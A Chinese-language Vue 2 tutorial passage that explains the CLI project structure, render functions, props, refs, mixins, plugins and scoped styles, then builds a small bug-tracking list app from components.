+ main.js 的名字可以修改，但是修改后要在 vue.config.js 文件中配置，一般不要修改

package.json：包的说明书（包的名字，包的版本，依赖哪些库）。该文件里有 webpack 的短命令：

+ serve（启动内置服务器）
+ build 命令是最后一次的编译，生成 html css js，给后端人员
+ lint 做语法检查的。

### 分析HelloWorld程序

首先是 public 下的 index.html 文件：

```html
<!DOCTYPE html>
<html lang="">
  <head>
    <meta charset="utf-8">
    <!-- 让IE浏览器启用最高渲染标准。IE8是不支持Vue的。 -->
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <!-- 开启移动端虚拟窗口（理想视口） -->
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <!-- 设置页签图标，从根路径开始获取，就是从public开始 -->
    <link rel="icon" href="<%= BASE_URL %>favicon.ico">
    <!-- 设置标题，通过插件从package.json中获取项目的name-->
    <title><%= htmlWebpackPlugin.options.title %></title>
  </head>
  <body>
    <!-- 当浏览器不支持JS语言的时候，显示如下的提示信息。 -->
    <noscript>
      <strong>We're sorry but <%= htmlWebpackPlugin.options.title %> doesn't work properly without JavaScript enabled. Please enable it to continue.</strong>
    </noscript>
    <!-- 容器 -->
    <div id="app"></div>
    <!-- built files will be auto injected -->
  </body>
</html>
```

在 index.html 文件中，没有看到引入 vue.js 文件，也没有看到引入 main.js 文件：Vue脚手架会自动找到 main.js 文件，不需要你动引入，所以 main.js 文件的名字不要随便修改，main.js 文件的位置不要随便动；至于引入 Vue.js 会在 main.js 中执行。

index.html 执行完后，就是 main.js 文件：

```js
// 这句代码等同于引入vue.js文件
import Vue from 'vue'
// 导入App组件（根组件）
import App from './App.vue'

// 关闭生产提示信息
Vue.config.productionTip = false

// 创建Vue实例
new Vue({
  render: h => h(App),
}).$mount('#app')
```

这个创建 Vue 实例中的 `$mount` 其实就相当于 el：

```js
new Vue({
  el : '#app',
  render : h => h(App)
})
```

然后看 App.vue 文件：

```vue
<template>
  <div id="app">
    <img alt="Vue logo" src="./assets/logo.png">
    <HelloWorld msg="Welcome to Your Vue.js App"/>
  </div>
</template>

<script>
// 导入组件
import HelloWorld from './components/HelloWorld.vue'

export default {
  name: 'App',  // 设置开发者工具中的组件名字
  components: {
    HelloWorld  // 注册组件
  }
}
</script>

<style>
#app {
  font-family: Avenir, Helvetica, Arial, sans-serif;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  text-align: center;
  color: #2c3e50;
  margin-top: 60px;
}
</style>
```

将之前写的单文件组件改过来。

只需要改 src 下的 App.vue 文件和 src/components 下的 vue 文件，然后修改 App.vue 文件中引入其他组件的路径：

![image-20240429084232928](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404290842163.png)

这时候启动项目：

```
npm run serve
```

然后会报错：

![image-20240429084411634](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404290844882.png)

这个错误的意思就是组件的名字太简单了，应该是多个单词。

如果你不希望在编译的时候检查这个语法，可以在 vue.config.js 文件中加上一句代码：

```js
const { defineConfig } = require('@vue/cli-service')
module.exports = defineConfig({
  transpileDependencies: true,
  lintOnSave : false  // 加上这一句，表示在保存的时候不检查语法
})
```

+ 假如在 js 中定义一个变量 x，但这个 x 没有使用，这也会报错，也可以这样关闭语法检查

然后再重新启动项目，就可以成功了：

![image-20240429084743478](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404290847730.png)

### vue.config.js

这是一个最开始的 vue.config.js 文件：

```js
const { defineConfig } = require('@vue/cli-service')
module.exports = defineConfig({
  transpileDependencies: true,
})
```

在 [VueCLI的配置参考](https://cli.vuejs.org/zh/config/) 中可以看到可以配置的东西有哪些：

![image-20240429085338302](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404290853604.png) 

其中 pages 配置项就是配置程序的入口文件的：

```js
const { defineConfig } = require('@vue/cli-service')
module.exports = defineConfig({
  transpileDependencies: true,
  // 保存时是否进行语法检查。true表示检查，false表示不检查。默认值是true。
  lintOnSave : false,
  // 配置入口
  pages: {
    index: {
      entry: 'src/main.js',
    }
  },
})
```

所以如果要修改 main.js 文件的位置或名字的话，就需要在这里修改。

### render 函数

在 main.js 文件中，创建 Vue 实例的时候是使用了一个 render 函数：

```js
new Vue({
  render: h => h(App),
}).$mount('#app')
```

如果将这个 render 改为原来的 template：

```js
new Vue({
  template: "<h1>render函数</h1>"
}).$mount('#app')
```

启动项目后控制台会报错：

![image-20240429085907325](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404290859568.png)

您正在使用 Vue 的仅运行时版本，其中模板编译器不可用。目前使用的 vue.js 是一个缺失了模板编译器的 vue.js 文件。怎么解决，两种方案：

+ 第一种：使用完整版的 vue.js： 

  ```js 
  import Vue from 'vue/dist/vue.js'
  ```

  这个完整的 vue.js 文件在 node_modules/vue/dist/vue.js

+ 第二种：使用render函数。

  先这样使用 render 函数：

  ```js 
  new Vue({
    render() {
      console.log(111);
    }
  }).$mount('#app')
  ```

  页面没有显示，但是控制台会输出，说明 render 函数被自动调用了。

  并且这个函数被调用时会接收一个参数，这个参数是一个函数：

  ```js 
  render(a) {
      console.log(a);
  }
  ```

  ![image-20240429091029052](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404290910299.png)

  这个函数是用来创建一个元素：

  ```js 
  render(createElement) {
     return createElement('div', 'render函数')
  }
  ```

  要将这个创建的元素返回才能显示：

  ![image-20240429091257091](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404290912343.png)

  所以创建组件的元素直接将组件传进去就可以了：

  ```js 
  render(createElement) {
     return createElement(App)
  }
  ```

  ![image-20240429091451910](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404290914164.png)

  可以将这个函数写成箭头函数：

  ```js 
  render : createElement => createElement(App)
  ```

  createElement只是一个参数名字，所以：

  ```js 
  new Vue({
    render: h => h(App),
  }).$mount('#app')
  ```

这个缺失的 vue.js 文件在哪？在 node_modules/vue/ 下有一个 package.json：

![image-20240429090355078](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404290903345.png)

这里这个名字 vue 就是 main.js 中引入的 vue，引入的文件的路径是 module 的值，所以实际引入的文件是 node_modules/vue/dist/vue.runtime.esm.js。

那为什么要用缺失的文件呢？

目的：减小体积。

Vue.js 包括两块：Vue 的核心 + 模板编译器（模板编译器可能占用 vue.js 文件体积的三分之一。）

将来程序员使用 webpack 进行打包处理之后，模板编译器就没有存在的必要了。

## props配置

创建一个 Car.vue 组件：

```vue
<template>
<div>
    <h3>品牌：{{brand}}</h3>
    <h3>价格：{{price}}</h3>
    <h3>颜色：{{color}}</h3>
    </div>
</template>

<script>
    export default {
        name : 'Car',
        data() {
            return {
                brand : '宝马520',
                price : 10,
                color : '黑色'
            }
        }, 
    }
</script>
```

然后在 App.vue 中注册：

```vue
<script>
    import Car from './components/Car.vue'
    export default {
        name : 'App',
        data() {
            return {
                msg : '汽车信息'
            }
        },
        components : {Car}
    }
</script>
```

然后使用这个注册：

```vue
<template>
    <div>
        <h1>{{msg}}</h1>
        <Car></Car>
        <Car></Car>
        <Car></Car>
    </div>
</template>
```

![image-20240429143144238](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404291431466.png)

现在这个组件实现了复用，但是组件的数据也被复用了。现要求每个组件都有自己的数据。这就需要使用 props 了，让数据变成动态的。

在父组件中找到使用的子组件，在这个子组件上使用属性传递数据，

```vue
<template>
    <div>
        <h1>{{msg}}</h1>
        <!-- 在App这个父组件当中，找到子组件Car，然后给Car这个子组件传数据：通过属性的形式传数据 -->
        <Car brand="宝马520" color="黑色" price="10"></Car>
        <hr>
        <Car brand="比亚迪汉" color="红色" price="20"></Car>
    </div>
</template>
```

然后在子组件中使用 props 来接收这个数据，使用 props 接收数据就不需要使用 data 配置项了，且 props 有好几种方式。

第一种方式：简单的接收方式，直接采用数组接收

```vue
<script>
export default {
    name: 'Car',
    props: ['brand', 'color', 'price']
}
</script>
```

![image-20240429143944941](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404291439164.png)

第二种：添加类型限制

```vue
<script>
    export default {
        name: 'Car',
        props : {
            brand : String,
            color : String,
            price : Number
        }
    }
</script>
```

这样表面看起来没有问题，但是打开控制台会发现报错：

![image-20240429144215009](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404291442219.png)

因为传值是这样写的：

```vue
<Car brand="宝马520" color="黑色" price="10"></Car>
```

这个 price 就是一个字符串，所以使用 v-bind 可以传值，而不是字符串：

```vue
<Car brand="宝马520" color="黑色" :price="10"></Car>
```

第三种：添加类型限制，并且还可以添加默认值，还可以添加必要性

```vue
<script>
    export default {
        name: 'Car',
        props : {
            brand : {
                type : String,
                required : true
            },
            color : {
                type : String,
                default : '红色'
            },
            price : {
                type : Number,
                required : true
            }
        }
    }
</script>
```

注意：不要修改 prop 中的数据。此时在 Car.vue 中添加一个按钮，点击一次将 price 加 1：

```vue
<template>
    <div>
        <h3>品牌：{{ brand }}</h3>
        <h3>价格：{{ price }}</h3>
        <h3>颜色：{{ color }}</h3>
        <button @click="add">价格加1</button>
    </div>
</template>

<script>
export default {
    name: 'Car',
    methods: {
        add() {
            this.price++
        }
    },
    props: {
        brand: {
            type: String,
            required: true
        },
        color: {
            type: String,
            default: '红色'
        },
        price: {
            type: Number,
            required: true
        }
    }
}
</script>
```

此时点击按钮，页面上正常显示，但是控制台报错了：

![image-20240429145157106](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404291451337.png)

表示避免直接更改 prop，因为每当父组件重新渲染时，该值都会被覆盖

如果非要修改的话，就找一个中转的变量 cprice：

```vue
<template>
    <div>
        <h3>品牌：{{brand}}</h3>
        <h3>价格：{{cprice}}</h3>
        <h3>颜色：{{color}}</h3>
        <button @click="add">价格加1</button>
    </div>
</template>

<script>
export default {
    name : 'Car',
    data() {
        return {
            cprice : this.price
        }
    },
    methods : {
        add(){
            this.cprice++
        }
    },
    props : {
        brand : {
            type : String,
            required : true
        },
        color : {
            type : String,
            default : '红色'
        },
        price : {
            type : Number,
            required : true
        }
    }
}
</script>
```

## 从父组件中获取子组件

此时 App.vue 是父组件，Car.vue 是自组件：

```vue
<template>
    <div>
        <h1>{{msg}}</h1>
        <Car brand="宝马520" color="黑色" :price="10"></Car>
        <hr>
        <Car brand="比亚迪汉" color="红色" :price="20"></Car>
    </div>
</template>

<script>
    import Car from './components/Car.vue'
    export default {
        name : 'App',
        data() {
            return {
                msg : '汽车信息'
            }
        },
        components : {Car}
    }
</script>
```

那么如何在父组件中获取子组件。

+ 打标记
+ 获取

先添加一个按钮，点击按钮就打印出汽车的信息：

```vue
<button @click="printCarInfo">打印汽车信息</button>
```

然后在你要获取的子组件上使用 `ref` 打标记：

```html
<Car brand="宝马520" color="黑色" :price="10" ref="car1"></Car>
<hr>
<Car brand="比亚迪汉" color="红色" :price="20" ref="car2"></Car>
```

接下来在 printCarInfo 中获取子组件，在方法中有个 this，这个 this 是当前的父组件 vc，vc 有一个属性 `$refs` ，这个属性可以获取页面中所有的组件（包括真实的 dom 元素）：

```html
<script>
import Car from './components/Car.vue'
export default {
    name: 'App',
    data() {
        return {
            msg: '汽车信息'
        }
    },
    methods: {
        printCarInfo() {
            // 获取子组件
            console.log(this.$refs.car1)
            console.log(this.$refs.car2)
        }
    },
    components: { Car }
}
</script>
```

可以看到拿到了两个组件：

![image-20240430095801393](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404300958796.png)

那么也就可以拿到组件的属性：

```js
console.log(this.$refs.car1.brand)
console.log(this.$refs.car1.color)
console.log(this.$refs.car1.price)
```

也可以拿到不是组件的 dom 元素：

```html
<h1 ref="hh">{{msg}}</h1>
```

```js
console.log(this.$refs.hh)
console.log(this.$refs.hh.innerText)
```

![image-20240430100243900](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404301002154.png)

## mixins配置（混入）

基本程序：App.vue

```vue
<template>
    <div>
        <User></User>
        <Vip></Vip>
    </div>
</template>

<script>
    import User from './components/User.vue'
    import Vip from './components/Vip.vue'
    export default {
        name : 'App',
        components : {User, Vip}
    }
</script>
```

User.vue

```vue
<template>
    <div>
        <h1>{{msg}}</h1>
        <h3>姓名：{{name}}</h3>
        <h3>年龄：{{age}}</h3>
        <button @click="printInfo">打印用户信息</button>
    </div>
</template>

<script>
    export default {
        name : 'User',
        data() {
            return {
                msg : '用户信息',
                name : '张三',
                age : 20
            }
        },
        methods: {
            printInfo(){
                console.log(this.name,',',this.age)
            }
        }
    }
</script>
```

Vip.vue

```vue
<template>
    <div>
        <h1>{{msg}}</h1>
        <h3>姓名：{{name}}</h3>
        <h3>年龄：{{age}}</h3>
        <button @click="printInfo">打印会员信息</button>
    </div>
</template>

<script>
    export default {
        name : 'User',
        data() {
            return {
                msg : '会员信息',
                name : '李四',
                age : 20
            }
        },
        methods: {
            printInfo(){
                    console.log(this.name,',',this.age)
            }
        }
    }
</script>
```

![image-20240430105212775](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404301052037.png)

此时发现，User 和 Vip 组件中有相同的代码片段，这些代码没有得到复用。应该将这个相同的方法提取出来到一个方法中，要使用的时候调用即可。	

新建一个 mixin.js 文件，该文件和 main.js 平级，然后将公共部分的代码放到这个 mixins 中的一个对象中，然后将这个对象暴露出去：

```js
export const mix1 = {
    methods: {
        printInfo(){
           console.log(this.name, ',' , this.age) 
        }
    }
}
```

然后在需要的位置导入，比如 User.vue：

```js
import {mix1} from '../mixin.js'

export default {
    name : 'User',
    data() {
        return {
            msg : '用户信息',
            name : '张三',
            age : 20
        }
    },
    mixins : [mix1]
}
```

这样也可以实现同样的功能。

但是现在有个疑问，假如 User.vue 和 Vip.vue 中都有个 a 方法，在混入中也定义了一个 a 方法，混入中的 a 方法会不会覆盖掉 User 和 Vip 中的 a 方法？不会，**混入不会破坏原有的东西**

User.vue

```vue
<template>
    <div>
        <h1>{{ msg }}</h1>
        <h3>姓名：{{ name }}</h3>
        <h3>年龄：{{ age }}</h3>
        <button @click="printInfo">打印用户信息</button>
        <button @click="a">打印用户a</button>
    </div>
</template>

<script>
import { mix1, mix2 } from '../mixin.js'

export default {
    name: 'User',
    data() {
        return {
            msg: '用户信息',
            name: '张三',
            age: 20
        }
    },
    mixins: [mix1, mix2],
    methods: {
        a() {
            console.log("User a.....");
        }
    }
}
</script>
```

mixin.js

```js
export const mix2 = {
    methods: {
        a() {
            console.log("Mixin a.....`");
        }
    }
}
```

发现 User 混入了 mix2，但是 a 方法并没有被覆盖：

![image-20240430110302445](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404301103701.png)

此时 Vip 中没有 a 方法，混入 mix2 后，调用的就是 mix2 中的 a：

![image-20240430111305758](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404301113048.png)

混入对生命周期的八个钩子函数有特殊处理。

此时 mixin.js 中定义一个钩子：

```js
export const mix3 = {
    mounted() {
        console.log('mixin.js mounted...')
    }
}
```

然后 User 中定义自己的钩子，同时混入 mix3：

```vue
<script>
import { mix1, mix2, mix3 } from '../mixin.js'

export default {
    name: 'User',
    mounted() { 
        console.log("User mounted...");
    },
    data() {
        return {
            msg: '用户信息',
            name: '张三',
            age: 20
        }
    },
    mixins: [mix1, mix2, mix3],
    methods: {
        a() {
            console.log("User a.....");
        }
    }
}
</script>
```

![image-20240430112210324](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404301122586.png)

所以对于 8 个生命周期的钩子函数来说

+ 不会有覆盖的问题
+ 先执行 mixins 中的钩子函数，再执行自己的

现在想要混入所有的组件，可以使用全局混入。

在 main.js 中：

```js
import { mix1, mix2, mix3 } from './mixin.js'

Vue.mixin(mix1)
Vue.mixin(mix2)
Vue.mixin(mix3)
```

这样所有的组件都混入 mix1、mix2、mix3

![image-20240430112728668](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404301127927.png)

## plugins配置（插件）

 给 Vue 做功能增强的。

定义插件：插件一般都放到一个 plugins.js 文件中

```js
const p1 = {
    install(Vue, a, b, c, d){
        console.log('这个插件正在显示一个可爱的封面....')
    }
}
```

每一个插件都是一个对象，每一个插件对象中必须有一个 install 方法，这个 install 方法会被自动调用。

install 方法上的参数：包括两部分

+ 第一部分：Vue 构造函数( main.js 中的 Vue 构造函数)
+ 第二部分：可以接收用户在使用这个插件时传过来的数据，参数个数无限制。

定义完插件后，要暴露插件：

```js
export const p1 = {
    install(Vue, a, b, c, d){
        console.log('这个插件正在显示一个可爱的封面....')
    }
}
```

要使用插件，先导入插件，在 main.js 中：

```js
import {p1} from './plugins.js'
```

然后使用插件，插件的使用通常放在创建 Vue 实例之前：

```js
Vue.use(p1, 1,2,3,4)
```

## 局部样式scoped

默认情况下，在 vue 组件中定义的样式最终会汇总到一块，如果样式名一致，会导致冲突，冲突发生后，以后来加载的组件样式为准。

User.vue
```vue
<template>
    <div class="s">
        <h1>{{msg}}</h1>
        <h3>姓名：{{name}}</h3>
        <h3>年龄：{{age}}</h3>
    </div>
</template>

<script>
</script>

<style>
   .s {
    background-color: aquamarine;
   } 
</style>
```

Vip.vue

```vue
<template>
    <div class="s">
        <h1>{{msg}}</h1>
        <h3>姓名：{{name}}</h3>
        <h3>年龄：{{age}}</h3>
    </div>
</template>

<script>
</script>

<style>
   .s {
    background-color:bisque
   } 
</style>
```

此时因为两个组件的类名产生了冲突，所以样式就以最后加载的组件为准，导致了两个组件的背景颜色是一样的：

![image-20240430145618569](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404301456874.png)

所以可以通过 scoped 来设置当前的样式是一个局部的：

```vue
<template>
    <div class="s">
        <h1>{{msg}}</h1>
        <h3>姓名：{{name}}</h3>
        <h3>年龄：{{age}}</h3>
    </div>
</template>

<script>
</script>

<style scoped>
   .s {
    background-color:bisque
   } 
</style>
```

加了 scoped 后：

![image-20240430150102795](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404301501100.png)

所以一般子组件中，样式上都会加一个属性 scoped，避免冲突。

如果想定义全局的样式，可以在 App.vue 跟组件中定义，根组件的 style 一般不加 scoped。

## 组件化综合案例BugList

### 实现静态组件

![image-20240430150353456](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404301503726.png)

组件化开发，第一步先提取组件：

![image-20240430150618213](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404301506538.png)

准备文件：

(1) App.vue

(2) BugHeader.vue

(3) BugList.vue

(4) BugItem.vue

(5) BugFooter.vue

然后将 BugItem 在 BugList 上注册，将 BugHeader、BugList、BugFooter 在 App 上注册：

App.vue

```vue
<template>
    <div>
        <BugHeader></BugHeader>
        <BugList></BugList>
        <BugFooter></BugFooter>
    </div>
</template>

<script>
import BugHeader from './components/BugHeader.vue'
import BugList from './components/BugList.vue'
import BugFooter from './components/BugFooter.vue'

export default {
    name: 'App',
    components: { BugHeader, BugList, BugFooter }
}
</script>
<style>样式代码太多，省略</style>
```

BugHeader.vue
```vue
<template>
    <div class="header">
        <textarea cols="105" rows="4" placeholder="请输入BUG的描述信息"></textarea>
        <br>
        <button class="small green button">保存</button>
    </div>
</template>

<script>
    export default {
        name : 'BugHeader',
    }
</script>

<style scoped>
/* header */
.header {
    margin-bottom: 20px;
    margin-top: 20px;
}
</style>
```

BugList.vue

```vue
<template>
    <div>
        <table>
            <thead>
                <tr>
                    <th class="c1">全选 <input type="checkbox"></th>
                    <th>bug描述</th>
                    <th class="c2">操作</th>
                </tr>
            </thead>
            <tbody>
                <BugItem></BugItem>
                <BugItem></BugItem>
                <BugItem></BugItem>
            </tbody>
        </table>
    </div>
</template>

<script>
import BugItem from './BugItem.vue';
export default {
    name: 'BugList',
    components: {
        BugItem
    }
}
</script>
```

BugItem.vue

```vue
<template>
    <tr>
        <td><input type="checkbox" checked></td>
        <td>xxxxxxxx</td>
        <td><button class="small red button">删除</button></td>
    </tr>
</template>

<script>
export default {
    name: 'BugItem',
}
</script>
```

BugFooter.vue

```vue
<template>
    <div class="footer">
        <button class="small red button">清除已解决</button>
        <span>当前BUG总量 2 个，已解决 1 个</span>
    </div>
</template>

<script>
export default {
    name: 'BugFooter',
}
</script>
```

此时的效果是：

![image-20240430152634257](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404301526591.png)

### 动态列表

将数据搞成动态的数据。应该有一个数组，用来存放 Bug 记录，每一个记录是一个 Bug 对象，这个对象有

+ id 属性
+ desc 描述属性
+ resolved 解决状态属性

在 BugList 中给定数据：

```vue
<script>
import BugItem from './BugItem.vue';
export default {
    name: 'BugList',
    data() {
        return {
            list: [
                    { id: 0, desc: "bug1", resolved: false },
                    { id: 1, desc: "bug2", resolved: true },
                    { id: 2, desc: "bug3", resolved: false },
            ]
        }
    },
    components: {
        BugItem
    }
}
</script>
```

然后使用 v-for 指令循环渲染 BugItem 组件，同时，要将 bug 对象当作数据传递给 BugItem 组件，让 BugItem 组件来渲染 bug 信息：在 BugLIst 中

```html
<tbody>
    <BugItem v-for="(bug) of list" :key="bug.id" :bug="bug"></BugItem>
</tbody>
```

这是父组件 BugList 向子组件 BugItem 传递数据，所以子组件需要使用 props 属性来接收数据，在 BugItem 中：

```vue
<script>
export default {
    name: 'BugItem',
    props: ['bug']
}
</script>
```

然后在 BugItem 中渲染 bug 信息，其中复选框的状态取决于 bug 对象的解决状态，已解决则选中：

```html
<template>
    <tr>
        <td><input type="checkbox" :checked=bug.resolved></td>
        <td>{{bug.desc}}</td>
        <td><button class="small red button">删除</button></td>
    </tr>
</template>
```

那么现在的效果是：

![image-20240430155225865](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404301552181.png)

### 保存bug

当点击保存按钮时，就将文本域中的信息作为 bug 的 desc 属性，向 bug 数组中新添加一条数据。

在 BugHeader 中，将文本域双向绑定一个属性 desc，给按钮绑定一个点击事件，当店家按钮，就获取 desc 的值，创建一个 bug 对象，再向 BugList 组件中的 list 数组添加数据。

但是当前组件是 BugHeader，而 bug 数组在  BugList 组件中，这两个组件并不是父子关系，如何将 BugList  的 list 数组给到 BugHeader 中？

App 组件是这两个组件的父组件，所以可将 list 数组定义在 App 组件中，然后由 App 组件传给 BugHeader 和 BugLIst，那么 BugHeader 就要通过 props 属性接收到 list 数组，让后修改这个 list 数组。这样虽然可以实现功能，但是这违背了 Vue 的原则，props 属性的数据是不应该被修改的。

所以不能直接将 list 传给子组件让子组件修改，只能由 App 组件来修改 list 数组，所以可以在 App 中定义一个方法来向 list 中插入一个 bug 对象，然后将这个方法传给子组件 BugHeader，由 BugHeader 来调用这个方法。

App.vue 中定义 list 数组，并将 list 传递给子组件

```vue
<template>
    <div>
        <BugHeader :saveBugCallBack="saveBugCallBack"></BugHeader>
        <BugList :list="list"></BugList>
        <BugFooter></BugFooter>
    </div>
</template>

<script>
import BugHeader from './components/BugHeader.vue'
import BugList from './components/BugList.vue'
import BugFooter from './components/BugFooter.vue'

export default {
    name: 'App',
    components: { BugHeader, BugList, BugFooter },
    data() {
        return {
            list: [
                { id: 0, desc: "bug1", resolved: false },
                { id: 1, desc: "bug2", resolved: true },
                { id: 2, desc: "bug3", resolved: false },
            ]
        }
    },
    methods: {
        // 保存bug对象的回调函数
        saveBugCallBack(bug) {
            this.list.unshift(bug)
        }
    }
}
</script>
```

BugList.vue 中接收 list 数组

```vue
<script>
import BugItem from './BugItem.vue';
export default {
    name: 'BugList',
    props: ['list'],
    components: {
        BugItem
    }
}
</script>
```

BugHeader.vue 中接收 saveBugCallBack 函数，并调用这个函数

```vue
<template>
    <div class="header">
        <textarea cols="105" rows="4" placeholder="请输入BUG的描述信息" v-model="desc"></textarea>
        <br>
        <button class="small green button" @click="saveBug">保存</button>
    </div>
</template>

<script>
export default {
    name: 'BugHeader',
    props: ['saveBugCallBack'],
    methods: {
        saveBug() {
            // 过滤空的提交
            // if (this.desc.trim() == '') return;
            if (!this.desc.trim()) return;
            // 创建bug对象
            let obj = { id: Date.now(), desc: this.desc, resolved: false };
            // 添加bug到数组中
            this.saveBugCallBack(obj);
            // 添加后情况文本域
            this.desc = '';
        }
    },
    data() {
        return {
            desc : '',
        }
    }
}
</script>
```

所以目前的结果：

![image-20240430161842772](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404301618131.png)

### 修改bug状态

勾选前面的复选款，表示 bug 已经被解决了；没有勾选就说明没有解决。这个复选款选中与否取决于 bug 对象的  resolved 属性。

在 BugItem 中，给复选框绑定一个点击事件或者是改变事件，将当前的 bug 对象的 id 传过去，因为肯定是根据 id 来修改 bug 对象的，同样的，BugItem 中是通过 props 来接受 bug 对象的，是不应该修改的，所以修改 bug 对象的状态还是只能在 App 组件中修改。

所以还是要在 App 组件中定义一个回调函数，将这个回调函数传给 BugList ，然后再由 BugList 传给 BugItem，不能直接从 App 传到 BugItem，因为 BugItem 不是 App 的子组件。

App.vue 中定义修改状态的函数并传递下去

```vue
<template>
    <div>
        <BugHeader :saveBugCallBack="saveBugCallBack"></BugHeader>
        <BugList :list="list" :modifyResolvedCallBack="modifyResolvedCallBack"></BugList>
        <BugFooter></BugFooter>
    </div>
</template>

<script>
import BugHeader from './components/BugHeader.vue'
import BugList from './components/BugList.vue'
import BugFooter from './components/BugFooter.vue'

export default {
    name: 'App',
    components: { BugHeader, BugList, BugFooter },
    data() {
        return {
            list: [
                { id: 0, desc: "bug1", resolved: false },
                { id: 1, desc: "bug2", resolved: true },
                { id: 2, desc: "bug3", resolved: false },
            ]
        }
    },
    methods: {
        // 保存bug对象的回调方法
        saveBugCallBack(bug) {
            this.list.unshift(bug)
        },
        // 修改某个bug对象的resolved值
        modifyResolvedCallBack(id) {
            this.list.forEach((bug, bugId) => {
                if (bug.id == id) 
                    bug.resolved = !bug.resolved;
            })
        }
    }
}
</script>
```

BugList.vue 中中转 App 传下来的回调方法

```vue
<tbody>
    <BugItem v-for="(bug) of list" :bug="bug" :key="bug.id"
             :modifyResolvedCallBack="modifyResolvedCallBack"></BugItem>
</tbody>

<script>
import BugItem from './BugItem.vue';
export default {
    name: 'BugList',
    props: ['list', 'modifyResolvedCallBack'],
    components: {
        BugItem
    }
}
</script>
```

BugItem.vue 中调用改回调方法

```vue
<template>
    <tr>
        <td><input type="checkbox" :checked="bug.resolved" @change="modifyResolved(bug.id)"></td>
        <td>{{bug.desc}}</td>
        <td><button class="small red button">删除</button></td>
    </tr>
</template>

<script>
export default {
    name: 'BugItem',
    props: ['bug', 'modifyResolvedCallBack'],
    methods: {
        modifyResolved(id) {
            this.modifyResolvedCallBack(id);
        }
    }
}
</script>
```

其实有个更简单的方法：

```html
<td><input type="checkbox" :v-model="bug.resolved"></td>
```

直接使用 v-model 双向绑定 bug 对象的 resolved 属性，因为 checkbox 没有指定 value 的时候，它的 value 就是 checked，所以可以通过勾选复选框来修改 bug 的resolved 的值。但是这样依旧是不应该的，因为这还是直接修改了通过 props 接收的 bug 对象，而 props 中的数据不应该修改，尽管这样控制台中没有报错。没有报错是因为 Vue 没有去检测对象内部属性的变化。

### 删除bug

点击删除的时候，将当前 bug 对象的 id 传过去，同样是只能在 App 组件中进行删除，在 BugItem 中调用删除的回调函数。

所以在 App.vue 中添加一个回调函数：

```js
// 删除数组中的某个bug对象：根据id删除
deleteBugCallBack(id) {
    // 注意：filter方法返回的是一个全新的数组。
    this.list = this.list.filter((bug) => {
        return bug.id != id
    })
}
```

然后传给 BugList，再由 BugList 传给 BugItem，BugItem 再通过点击事件来调用：

```vue
<template>
    <tr>
        <td><input type="checkbox" :checked="bug.resolved" @change="modifyResolved(bug.id)"></td>
        <td>{{bug.desc}}</td>
        <td><button class="small red button" @click="deleteBug(bug.id)">删除</button></td>
    </tr>
</template>

<script>
export default {
    name: 'BugItem',
    props: ['bug', 'modifyResolvedCallBack', 'deleteBugCallBack'],
    methods: {
        modifyResolved(id) {
            this.modifyResolvedCallBack(id);
        },
        deleteBug(id) {
            this.deleteBugCallBack(id);
        }
    }
}
</script>
```

### 统计bug

就是在 BugFooter 中统计 bug 的总数和已解决的个数。总数就是就是 App 组件中的 list 的长度，App 就是 BugFooter 的父组件，所以可以直接将 list 传过去，然后就可以展示 list 的总数，并且可以直接统计 list 中已解决的个数。

已解决的个数可以使用计算属性来实现。

BugFooter.vue 中

```vue
<template>
    <div class="footer">
        <button class="small red button">清除已解决</button>
        <span>当前BUG总量 {{ list.length }} 个，已解决 {{count}} 个</span>
    </div>
</template>

<script>
export default {
    name: 'BugFooter',
    props: ['list'],
    computed: {
        count() {
            let res = 0;
            this.list.forEach(bug => {
                if (bug.resolved) res++;
            });
            return res;
        }
    }
}
</script>
```

这个计算属性的实现方法还可以通过 ES6 数组中的 reduce 方法。

使用 ES6 数组的 reduce 方法进行对数组条件统计：

```js
this.bugList.reduce(回调函数, 统计起点)
```

+ 统计起点从 0 开始。
+ 回调函数有两个参数：a , b
  + a 是什么？a 是上一次回调函数调用之后的返回值。
  + b 是什么？当前被统计的对象。( bug 对象)
+ 回调函数的调用次数和数组中元素总数有关系。数组中有三个元素，则这个回调函数被调用三次。

```js
count() {
    const count = this.bugList.reduce((a, b) => {
        return a + (b.resolved ? 1 : 0)
    }, 0)
    return count 

    // 简写
    // return this.bugList.reduce((a, b) => a + (b.resolved ? 1 : 0), 0)
}
```

### 全选复选框

全选复选框的状态只有在所有 bug 复选卡中都打勾后，才会被打勾。 也就是说，全选的复选框是否打勾取决于 bug 总数量和以及解决数量是否相同。

但是全选复选框属于 BugList 组件中，而总数量和已解决数量在 BugFooter 中，这两组件是兄弟组件。但是 BugList 中有 list 属性，所以直接计算即可：

```html
<th class="c1">全选 <input type="checkbox" :checked="list.length == count && count > 0"></th>

<script>
import BugItem from './BugItem.vue';
export default {
    name: 'BugList',
    props: ['list', 'modifyResolvedCallBack', 'deleteBugCallBack'],
    computed: {
        count() {
            return this.list.reduce((a, b) => a + (b.resolved ? 1 : 0), 0);
        }
    },
    components: {
        BugItem
    }
}
</script>
```

